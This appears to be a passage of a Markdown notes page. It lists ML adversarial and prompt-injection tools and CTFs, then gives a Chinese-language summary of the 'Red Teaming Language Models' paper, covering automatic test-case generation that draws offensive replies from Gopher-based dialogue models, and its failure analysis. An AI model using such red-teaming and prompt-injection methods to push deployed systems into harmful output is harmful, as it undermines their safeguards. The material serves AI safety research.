- [Deep Pwning](https://github.com/cchio/deep-pwning) - Deep-pwning is a lightweight framework for experimenting with machine learning models with the goal of evaluating their robustness against a motivated adversary. 
- [Privacy Meter](https://github.com/privacytrustlab/ml_privacy_meter) - An open-source library to audit data privacy in statistical and machine learning algorithms.
- [TensorFlow Model Analysis](https://github.com/tensorflow/model-analysis) - A library for analyzing, validating, and monitoring machine learning models in production.
- [PromptInject](https://github.com/agencyenterprise/PromptInject) - A framework that assembles adversarial prompts.
- [TextAttack](https://github.com/QData/TextAttack) - TextAttack is a Python framework for adversarial attacks, data augmentation, and model training in NLP.
- [OpenAttack](https://github.com/thunlp/OpenAttack) - An Open-Source Package for Textual Adversarial Attack.
- [TextFooler](https://github.com/jind11/TextFooler) - A Model for Natural Language Attack on Text Classification and Inference.
- [Flawed Machine Learning Security](https://github.com/EthicalML/fml-security) - Practical examples of "Flawed Machine Learning Security" together with ML Security best practice across the end to end stages of the machine learning model lifecycle from training, to packaging, to deployment.
- [Adversarial Machine Learning CTF](https://github.com/arturmiller/adversarial_ml_ctf) - This repository is a CTF challenge, showing a security flaw in most (all?) common artificial neural networks. They are vulnerable for adversarial images.
- [Damn Vulnerable LLM Project](https://github.com/harishsg993010/DamnVulnerableLLMProject) - A Large Language Model designed for getting hacked
- [Gandalf Lakera](https://gandalf.lakera.ai/) - Prompt Injection CTF playground

## Red Team
### 摘要　
（Abstract）部分提到，語言模型（Language Models, LMs）常常因為有潛在的傷害性而無法被部署。傳統的方法是在部署前，使用人工標註來識別有害行為。然而，這樣的方法成本高昂，並限制了測試用例的數量和多樣性。本研究自動找出目標語言模型在哪些情況下會表現出有害行為，並使用另一個語言模型來生成測試用例（即“紅隊測試”）。研究還探討了多種生成測試用例的方法，從零標註生成到強化學習。

### Introdution
這篇論文的簡介部分開始於語言模型（Language Models, LMs）在多種應用中的潛力，包括作為對話助手和問答系統。然而，這些模型在實際應用中也帶來了一系列問題，特別是在與用戶互動時可能會產生不可預測的傷害。為了說明這一點，簡介提到了Microsoft的聊天機器人Tay，這是一個因為發送種族主義和性暗示的推文而被撤下的例子。

除了Tay之外，簡介還提到了其他研究，這些研究發現語言模型會生成不準確或機密的個人信息。這些失敗不僅會傷害用戶，而且會對企業和研究機構造成嚴重的法律和道德問題。因此，簡介強調，在部署這些模型之前，發現和修復這些問題是至關重要的。

簡介部分也提到了目前解決這些問題的一些方法，特別是人工標註。傳統上，研究人員會使用人工標註來識別模型可能的有害行為，然後根據這些標註來調整或訓練模型。然而，這種方法有兩個主要的缺點：一是成本高昂，二是它限制了測試用例的數量和多樣性。

為了解決這些問題，這篇論文提出了一種新的方法，即使用另一個語言模型來自動生成測試用例（也稱為“紅隊測試”）。這種方法不僅可以大大減少人工標註的成本，而且可以生成更多和更多樣化的測試用例，從而更全面地評估目標模型的性能和安全性。

簡介最後還提到了論文將探討的一些具體方法，包括從零標註生成到強化學習，以及如何使用這些方法來生成不同程度的多樣性和難度的測試用例。

總體而言，這篇論文的簡介部分為讀者提供了一個全面的背景，解釋了為什麼需要新的方法來評估和改進語言模型，特別是在考慮到它們可能帶來的傷害和風險時。

### RT Model
1. 問題背景和挑戰
這部分通常會討論語言模型（LMs）在實際應用中面臨的主要問題和挑戰。這些問題通常包括生成有害或冒犯性的內容、散播錯誤信息、以及泄露機密或個人信息。這些問題不僅會對用戶造成傷害，而且會對企業和研究機構帶來嚴重的法律和道德風險。因此，找到一種有效的方法來評估和改進語言模型的安全性和效能是至關重要的。

2. 紅隊測試（Red Teaming）的概念和應用
"Red Teaming" 是一種來自資訊安全領域的術語，用於描述一種模擬攻擊的過程，目的是找出系統的弱點和漏洞。在這篇論文中，這個概念被應用於語言模型的測試和評估。具體來說，研究人員使用一個語言模型來自動生成測試用例，然後使用這些測試用例來評估另一個目標語言模型。這種方法的優點是能夠大大減少人工標註的成本和時間，同時也能生成更多和更多樣化的測試用例。

3. 測試用例的生成方法
論文進一步探討了如何使用不同的方法來生成測試用例，包括零標註生成（Zero-shot Generation）和強化學習（Reinforcement Learning）。這些方法不僅可以用來評估目標模型是否會生成有害或冒犯性的內容，還可以用來評估模型在其他方面的性能和安全性。

4. 自動評估和分類
除了生成測試用例，論文還探討了如何使用分類器來自動評估生成的測試用例。這樣可以更有效地識別出模型的弱點和漏洞，並提供更全面的評估結果。

這些主要部分共同構成了"Red Teaming Language Models"這篇論文的核心框架和研究方法。每一部分都對於理解和改進語言模型的安全性和效能具有重要的意義。

### Red Teaming Offensive Language

LM基於的對話系統有生成冒犯性內容的風險。他們首先試圖找到能從Dialogue-Prompted Gopher (DPG)中引出冒犯性回覆的文本。DPG使用Gopher LM生成對話，並使用核心抽樣方法。他們還使用Gopher LM作為紅隊LM，並訓練一個模型來預測對話歷史中的發言是否冒犯。

### 過程中問題和挑戰

1. 生成冒犯性回覆的方法：這一點突顯了紅隊測試的能力，即揭示語言模型在面對具有冒犯性的問題或提示時可能會產生的冒犯性回覆。這顯示了紅隊測試的重要性，因為它可以幫助我們了解模型在這些情境下的行為。例如，如果一個方法問：“為什麼某某族群是壞的？”，這本身就是一個冒犯性的問題，並可能導致模型給出冒犯性的答案。

2. 所有方法的共同點：這一點表明，不同的紅隊測試方法都能揭示模型的冒犯性回覆，無論問題或提示是否直接具有冒犯性。這再次強調了紅隊測試的多樣性和徹底性。例如，即使問題看起來是中立的或無害的，模型仍然可能給出冒犯性的答案。

3. BAD問題與LM問題的比較：這一點指出，不同的紅隊測試方法可能會揭示不同的模型缺陷。這突顯了使用多種紅隊測試方法的優點，因為它們可以提供更全面的模型評估。

### 失敗和解決問題
文中主要探討了DPG（Dialogue-Prompted Gopher）在某些情境下產生冒犯性回覆的原因。以下是該部分的詳細內容：

DPG的失敗：

DPG的失敗主要是指它在某些情境下產生不適當或冒犯性的回覆。這些回覆可能是對某些問題的不恰當反應，或是對某些前提的錯誤接受。
分群方法：

為了更好地理解這些失敗，文中使用了分群方法來分析產生冒犯性回覆的測試案例。
使用FastText進行單詞嵌入，並計算每個測試案例的平均bag-of-words嵌入。
使用k-means分群法對這些嵌入進行分群，形成100個分群。
DPG的特定失敗模式：

這些分群揭示了DPG的特定失敗模式。例如，當問題具有冒犯性的前提時，DPG會隨之產生冒犯性的回覆。這些問題可能是詢問不道德的行為或不恰當的偏好。
另外，對於某些問題，DPG可能會以性或粗俗的方式回應，例如詢問DPG的尷尬經歷。
建議的解決方案：

基於上述的失敗模式，文中建議DPG的訓練數據或提示應該補充更多的例子。這些例子應該包括一位發言人拒絕另一位發言人的前提，或拒絕回答某些問題，以避免產生不恰當的回覆。
總之，這部分的目的是通過分群方法來深入理解DPG在某些情境下可能產生冒犯性回覆的原因，並提供了一些建議來改善這些問題。

